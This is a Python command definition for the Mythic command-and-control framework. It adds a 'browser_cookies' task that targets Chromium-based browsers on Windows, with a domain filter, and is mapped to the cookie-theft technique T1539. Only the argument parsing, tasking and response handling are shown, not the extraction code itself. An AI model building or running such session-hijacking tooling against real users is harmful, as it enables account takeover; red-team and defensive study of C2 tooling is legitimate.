from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json


class BrowserCookiesArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="browser",
                cli_name="browser",
                display_name="Browser",
                type=ParameterType.ChooseOne,
                choices=["chrome", "edge", "brave", "opera", "all"],
                default_value="all",
                description="Target browser for cookie extraction.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=1)],
            ),
            CommandParameter(
                name="domain_filter",
                cli_name="domain",
                display_name="Domain Filter",
                type=ParameterType.String,
                default_value="",
                description="Filter cookies by domain (e.g., '.github.com'). Leave empty for all domains.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=2)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            self.add_arg("browser", "all")
            self.add_arg("domain_filter", "")
        elif self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            parts = self.command_line.split()
            if len(parts) >= 1:
                self.add_arg("browser", parts[0])
            else:
                self.add_arg("browser", "all")
            if len(parts) >= 2:
                self.add_arg("domain_filter", parts[1])
            else:
                self.add_arg("domain_filter", "")


class BrowserCookiesCommand(CommandBase):
    cmd = "browser_cookies"
    needs_admin = False
    help_cmd = "browser_cookies [-browser <chrome|edge|brave|opera|all>] [-domain <domain_filter>]"
    description = "Extract cookies from Chromium-based browsers for session hijacking analysis."
    version = 1
    author = "b4r0n"
    argument_class = BrowserCookiesArguments
    attackmapping = ["T1539"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        resp = PTTaskCreateTaskingMessageResponse(TaskID=taskData.Task.ID, Success=True)
        browser = taskData.args.get_arg("browser")
        domain_filter = taskData.args.get_arg("domain_filter")

        if domain_filter:
            resp.DisplayParams = f"-browser {browser} -domain {domain_filter}"
        else:
            resp.DisplayParams = f"-browser {browser}"

        await MythicRPC().execute(
            "create_artifact",
            task_id=taskData.Task.ID,
            artifact=f"Browser cookie extraction: {browser}",
            artifact_type="API Call",
        )

        return resp

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        if response:
            response_text = response if isinstance(response, str) else json.dumps(response, indent=2)
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response=response_text.encode(),
                )
            )
        return resp
